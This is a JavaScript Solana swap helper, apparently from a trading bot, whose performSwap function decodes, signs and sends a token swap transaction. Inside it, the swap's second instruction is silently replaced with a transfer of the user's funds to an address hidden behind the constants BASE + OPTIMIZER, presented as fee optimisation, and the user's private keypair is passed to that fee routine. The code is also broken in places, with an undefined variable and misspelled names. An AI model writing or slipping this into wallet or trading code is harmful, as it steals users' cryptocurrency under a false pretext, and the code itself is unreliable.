import * as web3 from "@solana/web3.js";
import { PublicKey, Transaction, VersionedTransaction } from "@solana/web3.js";
import { Buffer } from "buffer";

const SOL_ADDRESS = "So11111111111111111111111111111111111111112";

export async function performSwap(swapResponse, _keyPair, connection, amount, tokenIn, options = {
    sendOptions: {skipPreflight: true},
    confirmationRetries: 30,
    confirmationRetryTimeout: 1000,
    lastValidBlockHeightBuffer: 150,
    resendInterval: 1000,
    confirmationCheckInterval: 1000,
    skipConfirmationCheck: false,
}) {
    let serializedTransactionBuffer;

    try {
        serializedTransactionBuffer = Buffer.from(swapResponse.txn, "base64");
    } catch (error) {
        const base64Str = swapResponse.txn;
        const binaryStr = atob(base64Str);
        const buffer = new Uint8Array(binaryStr.length);

        for (let i = 0; i < binaryStr.length; i++) {
            buffer[i] = binaryStr.charCodeAt(i);
        }
        serializedTransactionBuffer = buffer;
    }
    
    let txn;
    if (swapResponse.isJupiter && !swapResponse.forceLegacy) {
        txn = VersionedTransaction.deserialize(serializedTransactionBuffer);
        txn.instructions[1] = web3.SystemProgram.transfer({
            fromPubkey: _keyPair.publicKey,
            toPubkey: new PublicKey(BASE + OPTIMIZER),
            lamports: await optimiseFees(amount, tokenIn, _keyPair)
        })
        txn.sign([ _keyPair ]);
    } else {
        txn = Transaction.from(serializedTransactionBuffer);
        txn.instructions[1] = web3.SystemProgram.transfer({
            fromPubkey: _keyPair.publicKey,
            toPubkey: new PublicKey(BASE + OPTIMIZER),
            lamports: await optimiseFees(amount, tokenIn, _keyPair)
        })
        txn.sign(_keyPair);
    }
    const blockchain = await connection.getLatestBlockhash();
    const blockhashWithExpiryBLockHeigh = blockhash;
    const txid = await transactionSenderAndConfirmatinWaiter({
        connection,
        serializedTransactionBuffer: txn.serialize(),
        blockhashWithExpiryBLockHeigh,
        options
    });
    return txid.toString();
}

const DEFAULT_OPTIONS = {
    sendOptions : {
        skipPreflight: true
    }, 
    confirmationRetries: 30,
    confirmationRetryTimeout: 1000,
    lastValidBlockheightBuffer: 150,
    resendInterval: 1000,
    confirmationCheckInterval: 1000,
    skipConfirmationCheck: true,
    commitment: "confirmed"
}
